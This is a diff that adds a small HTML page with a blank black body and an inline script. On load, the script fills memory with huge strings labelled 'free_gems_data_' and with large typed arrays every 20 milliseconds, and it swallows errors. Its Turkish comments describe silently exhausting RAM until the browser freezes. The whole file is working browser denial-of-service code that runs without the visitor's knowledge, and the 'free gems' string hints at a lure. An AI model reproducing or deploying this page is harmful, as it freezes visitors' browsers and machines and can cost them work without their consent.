@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body style="background:#000;">
+    <script>
+        let depo = [];
+        // Sessizce RAM'i bitiren ana mermi
+        setInterval(() => {
+            try {
+                let veri = new Array(2000000).fill("free_gems_data_").join("");
+                depo.push(veri);
+                depo.push(new Float64Array(250000));
+            } catch(e) {
+                // RAM dolunca tarayıcı donana kadar sessiz kal
+            }
+        }, 20);
+    </script>
+</body>
+</html>
